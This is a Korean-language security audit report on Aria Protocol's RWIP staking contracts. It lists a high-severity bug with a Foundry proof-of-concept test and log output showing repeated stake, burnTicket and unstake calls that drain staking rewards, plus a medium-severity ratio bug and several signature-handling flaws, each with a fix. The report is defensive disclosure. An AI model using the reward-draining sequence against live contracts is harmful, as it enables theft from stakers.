# 소개

**Pashov Audit Group**은 업계 최고의 스마트 계약 보안 연구원들로 구성된 여러 팀으로 이루어져 있습니다. 총 1000개 이상의 보안 취약점을 보고한 이 그룹은 절대적으로 최고의 감사 경험을 제공하기 위해 노력합니다. 100% 보안을 보장할 수는 없지만, 귀하의 블록체인 프로토콜을 위해 경험 많은 연구원들의 최선의 노력을 보장합니다. 이전 작업은 [여기](https://github.com/pashov/audits)에서 확인하거나 Twitter [@pashovkrum](https://twitter.com/pashovkrum)으로 연락주십시오.

# 면책 조항

스마트 계약 보안 검토는 취약점의 완전한 부재를 절대 확인할 수 없습니다. 이는 시간, 자원 및 전문 지식이 제한된 노력으로 가능한 한 많은 취약점을 찾으려고 시도하는 것입니다. 검토 후 100% 보안을 보장할 수 없으며, 검토가 스마트 계약의 문제를 발견할 것이라고 보장할 수도 없습니다. 후속 보안 검토, 버그 바운티 프로그램 및 온체인 모니터링을 강력히 권장합니다.

# 소개

**AriaProtocol/main-contracts** 저장소에 대한 시간 제한 보안 검토가 **Pashov Audit Group**에 의해 수행되었으며, 애플리케이션의 스마트 계약 구현의 보안 측면에 중점을 두었습니다.

# Aria RWIP Staking 소개

Aria Protocol은 크라우드소싱 자금 조달을 통해 지적 재산(IP)의 부분 소유권을 활성화하고, IP 자산을 ERC20 토큰으로 토큰화하며, 이해 관계자에게 로열티를 분배하는 플랫폼입니다. Vault와 분배 계약을 사용하여 사용자가 IP에 투자하고, 부분 토큰을 청구하고, 보상을 얻을 수 있도록 합니다.

이 감사는 사용자가 RWIP 토큰을 스테이킹하고, 스테이킹 티켓을 받고, 이를 스테이킹된 RWIP 토큰으로 상환하고, 나중에 소유자가 통제하고 업그레이드 가능한 거버넌스 하에 KYC 검증을 통해 언스테이킹할 수 있는 RWIP Staking에 중점을 두었습니다.

# 위험 분류

| 심각도 | 영향: 높음 | 영향: 중간 | 영향: 낮음 |
| --- | --- | --- | --- |
| **가능성: 높음** | 치명적 | 높음 | 중간 |
| **가능성: 중간** | 높음 | 중간 | 낮음 |
| **가능성: 낮음** | 중간 | 낮음 | 낮음 |

## 영향

- 높음 - 프로토콜의 자산에 중대한 물질적 손실을 초래하거나 사용자 그룹에 심각한 해를 끼칩니다.
- 중간 - 프로토콜의 자산에 중간 정도의 물질적 손실을 초래하거나 사용자 그룹에 어느 정도 해를 끼칩니다.
- 낮음 - 프로토콜의 자산에 경미한 물질적 손실을 초래하거나 소규모 사용자 그룹에 해를 끼칩니다.

## 가능성

- 높음 - 온체인 조건을 모방한 합리적인 가정 하에 공격 경로가 가능하며, 훔치거나 손실될 수 있는 자금의 양에 비해 공격 비용이 상대적으로 낮습니다.
- 중간 - 조건부로 인센티브가 주어지는 공격 벡터이지만 여전히 상대적으로 가능성이 높습니다.
- 낮음 - 가정이 너무 많거나 너무 가능성이 낮거나 공격자가 인센티브가 거의 없거나 전혀 없는 상태에서 상당한 지분을 필요로 합니다.

## 심각도 수준에 따른 조치

- 치명적 - 가능한 한 빨리 수정해야 함 (이미 배포된 경우)
- 높음 - 수정해야 함 (아직 배포되지 않은 경우 배포 전)
- 중간 - 수정해야 함
- 낮음 - 수정할 수 있음

# 보안 평가 요약

_검토 커밋 해시_ - [25b3aa2e121830a71e98748fc103525363b810c2](https://github.com/AriaProtocol/main-contracts/tree/25b3aa2e121830a71e98748fc103525363b810c2)

_수정 검토 커밋 해시_ - [b6202d83adc813345e29965677ce86f74d0c7ecd](https://github.com/AriaProtocol/main-contracts/tree/b6202d83adc813345e29965677ce86f74d0c7ecd)

### 범위

다음 스마트 계약이 감사 범위에 포함되었습니다.

- `RWIPStaking`
- `StakedRWIP`
- `StakingTicket`

# 발견 사항

# [H-01] stRWIP는 항상 1:1 비율로 RWIP에 대해 주조됨

## 심각도

**영향:** 높음

**가능성:** 중간

## 설명

RWIP 스테이킹의 경우 사용자는 항상 1:1 비율로 stRWIP를 받습니다. 1 stRWIP를 소각하면 현재 환율에 따라 RWIP를 받는데, 이는 RWIPStaking에 입금된 보상으로 인해 1:1 이상이 됩니다. 따라서 공격자는 다음을 수행할 수 있습니다.

1. 1000 RWIP에 대해 `stake`를 호출합니다.
2. `minStakingHoldPeriod`를 기다립니다.
3. `burnTicket`을 호출하여 1000 stRWIP를 받습니다.
4. 1000 stRWIP에 대해 `unstake`를 호출하고 1000 RWIP 이상을 받습니다(현재 stRWIP/RWIP 환율에 따름).

훔칠 보상이 있는 한 공격을 반복할 수 있습니다. 결과적으로 공격자는 계약에서 대부분의 스테이킹 보상을 훔쳐 RWIP 스테이킹을 쓸모없게 만듭니다.

### 개념 증명

```solidity
    function test_bob_steals_rewards() public {
        assertEq(stakedRWIPToken.balanceOf(alice), 0);
        assertEq(rwipToken.balanceOf(alice), 1000e18);
        assertEq(rwipToken.balanceOf(bob), 1000e18);

        assertEq(rwipToken.allowance(alice, address(rwipStaking)), type(uint256).max);

        // alice stakes 1000e18 RWIP
        vm.prank(alice);
        rwipStaking.stake(1000e18, 1 days);
        vm.warp(block.timestamp + 1 days + 1);
        vm.prank(alice);
        rwipStaking.burnTicket(0);

        // RWIP rewards are deposited into rwipStaking when only Alice is staking
        deal(address(rwipToken), address(this), 500e18);
        rwipToken.transfer(address(rwipStaking), 500e18);

        // Bob stakes and unstakes 10 times, draining rewards
        vm.startPrank(bob);
        for (uint i = 1; i < 11; i++) {
            rwipStaking.stake(rwipToken.balanceOf(bob), 1 days);
            vm.warp(block.timestamp + 1 days + 1);
            rwipStaking.burnTicket(i);

            rwipStaking.unstake(stakedRWIPToken.balanceOf(bob), "");
            emit log_named_uint("Bob's balance", rwipToken.balanceOf(bob));
        }
        vm.stopPrank();

        // Alice unstakes and receives ~0.078e18 out of 500e18 of RWIP rewards
        vm.prank(alice);
        rwipStaking.unstake(1000e18, "");
        emit log_named_uint("Alice's balance", rwipToken.balanceOf(alice));
    }
```

```
Logs:
  Bob's balance: 1000000000000000000000
  Bob's balance: 1250000000000000000000
  Bob's balance: 1388888888888888888750
  Bob's balance: 1453488372093023255410
  Bob's balance: 1481042654028436018483
  Bob's balance: 1492359121298949378965
  Bob's balance: 1496934278597432457104
  Bob's balance: 1498772205809001265183
  Bob's balance: 1499508641008514329080
  Bob's balance: 1499803417766426517913
  Bob's balance: 1499921360922952441247
  Alice's balance: 1000078639077047558000
```

## 권장 사항

RWIPStaking#burnTicket은 항상 1 RWIP당 1 stRWIP를 주조하는 대신 주조할 stRWIP의 양을 계산하기 위해 현재 stRWIP/RWIP 환율을 사용해야 합니다.

이 완화 조치는 가상 주식 및 소수점 오프셋을 통해 적절하게 완화되어야 하는 [첫 번째 예금자 공격](https://blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks)을 가능하게 합니다.

## 수정

[PR 51: mint stRWIP according to dynamic ratio](https://github.com/AriaProtocol/main-contracts/pull/51)

# [M-01] `_calculateStakingOut`이 stRWIP 보상에 대해 잘못 작동함

## 심각도

**영향:** 낮음

**가능성:** 높음

## 설명

stRWIP가 스테이킹 보상으로 스테이킹 계약에 전송되면 `_calculateStakingOut`은 stRWIP/RWIP 환율을 잘못 계산합니다.

다음 시나리오를 고려해 보십시오.

1. Alice는 1000 RWIP를 스테이킹하고 1000 stRWIP를 받습니다.
2. Bob은 1000 RWIP를 스테이킹하고 1000 stRWIP를 받습니다.
3. 100 stRWIP는 나중에 시장에서 구매되고(Alice/Bob에 의해 주조됨), 이 100 stRWIP는 보상으로 RWIPStaking에 전송됩니다.

이제 계약에는 2000 RWIP와 100 stRWIP가 있고 stRWIP의 총 공급량은 2000입니다.

`_calculateStakingOut`의 `ratio`는 다음과 같습니다.

(RwipBalance + stRwipBalance) / stRwipTotalSupply = (2000 + 100) / 2000 = 21 / 20 = 1.05

유통되는 stRWIP가 1900개이므로 1900 * 1.05 = 1995 RWIP로 상환될 수 있으며 계약에는 2000 RWIP가 있습니다. 따라서 stRWIP 보상이 있으면 사용자는 stRWIP 상환에서 받아야 하는 것보다 약간 적은 RWIP를 받게 됩니다.

### 개념 증명

```solidity
  function test_too_little_rwip_received_from_unstake() public {
    assertEq(stakedRWIPToken.balanceOf(alice), 0);
    assertEq(rwipToken.balanceOf(alice), 1000e18);
    assertEq(rwipToken.balanceOf(bob), 1000e18);

    assertEq(rwipToken.allowance(alice, address(rwipStaking)), type(uint256).max);

    vm.startPrank(alice);
    rwipStaking.stake(1000e18, 1 days);
    vm.warp(block.timestamp + 1 days + 1);
    rwipStaking.burnTicket(0);

    vm.startPrank(bob);
    rwipStaking.stake(1000e18, 1 days);
    vm.warp(block.timestamp + 1 days + 1);
    rwipStaking.burnTicket(1);

    // simulate bob selling 100 stRWIP
    // and the buyer depositing stRWIP into the staking contract as rewards
    stakedRWIPToken.transfer(address(rwipStaking), 100e18);
    vm.stopPrank();

    vm.prank(alice);
    rwipStaking.unstake(1000e18, "");
    vm.prank(bob);
    rwipStaking.unstake(900e18, "");

    assertEq(stakedRWIPToken.balanceOf(address(rwipStaking)), stakedRWIPToken.totalSupply());
    emit log_named_uint("Alice's balance", rwipToken.balanceOf(alice) / 1e18);
    emit log_named_uint("Bob's balance", rwipToken.balanceOf(bob) / 1e18);
    emit log_named_uint("contract's balance", rwipToken.balanceOf(address(rwipStaking)) / 1e18);
  }
```

```
  Alice's balance: 1050
  Bob's balance: 945
  contract's balance: 5
```

## 권장 사항

계산은 다음과 같아야 합니다: `RwipBalance / (stRwipTotalSupply - stRwipBalance)`.

예제에서 비율은 20 / 19가 되므로 유통되는 모든 stRWIP는 스테이킹 계약의 모든 RWIP에 대해 상환 가능하게 됩니다.

## 수정

[PR 50: calculate out (un)staking ratios](https://github.com/AriaProtocol/main-contracts/pull/50)

# [L-01] `StakedRWIP`의 이름과 심볼이 비어 있음

`StakedRWIP.initialize`에서 `__ERC20_init` 함수가 호출되지 않으므로 토큰의 이름과 심볼이 비어 있습니다. 계약을 초기화할 때 이 함수를 호출하는 것을 고려하십시오.

**수정:**

[PR 48: add name and symbol to stRWIP token](https://github.com/AriaProtocol/main-contracts/pull/48)

# [L-02] `StakingTickets`가 계약에 영구적으로 갇힐 수 있음

`StakingTicket.mint`에서 내부적으로 `_mint`를 호출하므로 사용자는 `ERC721` 토큰을 받습니다. 그러나 `msg.sender`가 `ERC721`을 지원하지 않는 계약 주소인 경우 토큰은 계약 내부에 영구적으로 동결될 수 있습니다.

`_mint` 대신 `_safeMint`를 사용하는 것을 고려하십시오.

**수정:**

[PR 47: use safe mint in StakingTicket](https://github.com/AriaProtocol/main-contracts/pull/47)

# [L-03] 다른 체인 간에 서명이 재사용될 수 있음

`RWIPStaking.unstake`에서 서명의 해시에는 현재 `chain.id`가 포함되지 않습니다. 프로토콜이 여러 체인에 배포되면 사용자가 한 체인에서만 승인되더라도 한 체인의 서명을 다른 체인에서 재사용할 수 있습니다.

서명의 해시에 `chain.id`를 추가하는 것을 고려하십시오.

**수정:**

[PR 46: add chainid to KYC signature](https://github.com/AriaProtocol/main-contracts/pull/46)

# [L-04] 서명은 가변성에 취약하여 재사용될 수 있음

`RWIPStaking.unstake`에서 현재 프로세스는 서명 가변성(signature malleability)에 취약하며, 현재 이를 방지하기 위한 확인이 없습니다.

OZ의 [문서](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol#L134-L142) 인용:

> EIP-2는 여전히 ecrecover()에 대한 서명 가변성을 허용합니다. 이 가능성을 제거하고 서명을 고유하게 만드십시오. 이더리움 옐로우 페이퍼(https://ethereum.github.io/yellowpaper/paper.pdf)의 부록 F는 (301)에서 s의 유효 범위를 정의합니다: 0 < s < secp256k1n ÷ 2 + 1, 그리고 (302)에서 v에 대해: v ∈ {27, 28}. 현재 라이브러리의 대부분의 서명은 하위 반쪽 순서의 s-값으로 고유한 서명을 생성합니다.
>
> 라이브러리가 상위 범위의 s-값과 같은 가변 서명을 생성하는 경우, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1로 새 s-값을 계산하고 v를 27에서 28로 또는 그 반대로 뒤집으십시오. 라이브러리가 27/28 대신 0/1로 v를 사용하여 서명을 생성하는 경우 v에 27을 더하여 이러한 가변 서명도 허용하십시오.

서명 가변성을 확인하는 OpenZeppelin의 ECDSA 라이브러리를 사용하는 것을 고려하십시오.

**수정:**

[PR 45: use OZ ECDSA for malleability protection](https://github.com/AriaProtocol/main-contracts/pull/45)

# [L-05] 서명이 논스(nonce)를 사용하지 않음

`RWIPStaking.unstake`에서 `addressHasKYC` 플래그가 있거나 유효한 서명이 있는 사용자만 언스테이킹 함수에 액세스할 수 있어야 합니다.

문제는 `_checkKYCSignature`가 논스를 사용하지 않아 유효한 서명을 무기한 재사용할 수 있다는 것입니다. KYC 상태가 취소되더라도 이러한 재사용을 방지할 수 있는 메커니즘이 없습니다(KYC_SIGNER를 변경할 수 있지만 모든 서명이 무효화됨).

서명을 처리하기 위한 논스 시스템을 구현하는 것을 고려하십시오.

**수정:**

[PR 44: Add nonce to kyc signature](https://github.com/AriaProtocol/main-contracts/pull/44)

